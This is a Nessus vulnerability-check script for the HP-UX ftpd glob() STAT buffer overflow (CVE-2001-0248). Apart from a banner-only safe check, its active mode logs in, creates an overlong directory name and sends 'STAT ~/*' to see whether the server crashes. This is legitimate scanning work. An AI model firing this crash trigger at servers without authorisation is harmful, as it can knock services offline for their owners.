#
# This script was written by Xue Yong Zhi <yong@tenablesecurity.com>
#
# (C) Tenable Network Security
#
#
# See the Nessus Scripts License for details
#
# TODO: have not observered enough HP-UX FTP banners, safecheck
# is inaccurate and even wrong!
#
# TODO: do not check other FTPD 
#
# From COVERT-2001-02:
# "when an FTP daemon receives a request involving a
# file that has a tilde as its first character, it typically runs the
# entire filename string through globbing code in order to resolve the
# specified home directory into a full path.  This has the side effect
# of expanding other metacharacters in the pathname string, which can
# lead to very large input strings being passed into the main command
# processing routines. This can lead to exploitable buffer overflow
# conditions, depending upon how these routines manipulate their input."
#

if(description)
{
 script_id(11372);
 script_bugtraq_id(2552);
 script_version ("$Revision: 1.7 $");
 script_cve_id("CVE-2001-0248");
 name["english"] = "HP-UX ftpd glob() Expansion STAT Buffer Overflow";

 script_name(english:name["english"]);

 desc["english"] = "
Buffer overflow in FTP server in HPUX 11 and previous
allows remote attackers to execute arbitrary commands
by creating a long pathname and calling the STAT
command, which uses glob to generate long strings.

Solution : upgrade your FTP server
Consider removing directories writable by 'anonymous'.


Risk factor : High";


 script_description(english:desc["english"]);


 script_summary(english:"Checks if the remote HPUX ftp can be buffer overflown",
 		francais:"Détermine si le serveur HPUX ftp distant peut etre soumis a un dépassement de buffer");
 script_category(ACT_MIXED_ATTACK); 
 script_family(english:"FTP");


 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");

 script_dependencie("find_service.nes", "ftp_writeable_directories.nasl");
 script_require_keys("ftp/login", "ftp/writeable_dir");
 script_require_ports("Services/ftp", 21);
 exit(0);
}

#
# The script code starts here :
#

include("ftp_func.inc");

port = get_kb_item("Services/ftp");
if(!port)port = 21;
if(!get_port_state(port))exit(0);


# First, we need access
login = get_kb_item("ftp/login");
password = get_kb_item("ftp/password");



# Then, we need a writeable directory
wri = get_kb_item("ftp/writeable_dir");



safe_checks = 0;
if(!login || !password || !wri || safe_checks())safe_checks = 1;


if(safe_checks)
{
 banner = get_ftp_banner(port: port);
 if(banner)
 {
  vuln = 0;

  #HP-UX 10.0, 10.10, 10.20, 10.30, 11.0(ICAT)
  #HP HP-UX 10.0.1, 10.10, 10.20, 11.0 and HP HP-UX (VVOS) 10.24, 11.0.4(bugtrap)
  #Actually Looking for 10.*, 11.0* here
  if(egrep(pattern:"FTP server.*[vV]ersion[^0-9]*(10\.[0-9]+|11\.0)",
  	  string:banner))vuln = 1;

  if(vuln)
  {
    desc = "
Buffer overflow in FTP server in HPUX 11 and previous
allows remote attackers to execute arbitrary commands
by creating a long pathname and calling the STAT
command, which uses glob to generate long strings.

*** Nessus reports this vulnerability using only
*** information that was gathered. Use caution
*** when testing without safe checks enabled.

Solution : upgrade your FTP server and/or libc
Consider removing directories writable by 'anonymous'.


Risk factor : High";

  security_hole(port:port, data:desc);
  }
 }

 exit(0);
}


# Connect to the FTP server
soc = open_sock_tcp(port);
if(soc)
{
 if(login && wri)
 {
	if(ftp_authenticate(socket:soc, user:login, pass:password))
	{
		# We are in

		c = string("CWD ", wri, "\r\n");
		send(socket:soc, data:c);
		b = ftp_recv_line(socket:soc);
		if(!egrep(pattern:"^250.*", string:b)) exit(0);
		mkd = string("MKD ", crap(505), "\r\n");	#505+4+2=511
		mkdshort = string("MKD ", crap(249), "\r\n");	#249+4+2=255
		stat = string("STAT ~/*\r\n");

		send(socket:soc, data:mkd);
		b = ftp_recv_line(socket:soc);
		if(!egrep(pattern:"^257 .*", string:b)) {
			#If the server refuse to creat a long dir for some 
			#reason, try a short one to see if it will die.
			send(socket:soc, data:mkdshort);
			b = ftp_recv_line(socket:soc);
			if(!egrep(pattern:"^257 .*", string:b)) exit(0);
		}

		#STAT use control channel
		send(socket:soc, data:stat);
		b = ftp_recv_line(socket:soc);
		if(!b){
			security_hole(port);
			exit(0);
		} else {
			ftp_close(socket:soc);
		}

	}
 }
}
